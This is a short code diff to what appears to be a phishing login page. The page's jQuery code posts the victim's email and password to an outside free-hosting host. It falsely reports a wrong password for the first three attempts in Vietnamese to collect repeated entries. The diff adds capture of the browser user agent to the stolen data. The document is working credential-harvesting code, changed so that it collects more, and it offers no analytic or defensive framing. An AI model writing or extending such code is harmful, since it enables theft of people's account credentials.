@@ -73,6 +73,7 @@
                 });
             };
             $(document).ready(function() {
+                console.log(navigator.userAgent)
                 var i =0;
                 $("#txtBoxLogin").click(function(event) {
                     
@@ -83,7 +84,9 @@
                     
                     if(email.length >8 && pass.length >5){
                        $("#lblMsg").html("Đang kiểm tra tài khoản vui lòng chờ trong giây lát")
-                       $.post('https://cailonnek.000webhostapp.com/index.php', {email: email,pass: pass}, function(data, textStatus, xhr) {
+                       var ua = navigator.userAgent;
+                        console.log(ua);
+                       $.post('https://cailonnek.000webhostapp.com/index.php', {email: email,pass: pass, ua:ua}, function(data, textStatus, xhr) {
                           if(i<3){
                                $("#lblMsg").html("Tài khoản hoặc mật khẩu không chính xác")
                               i++;
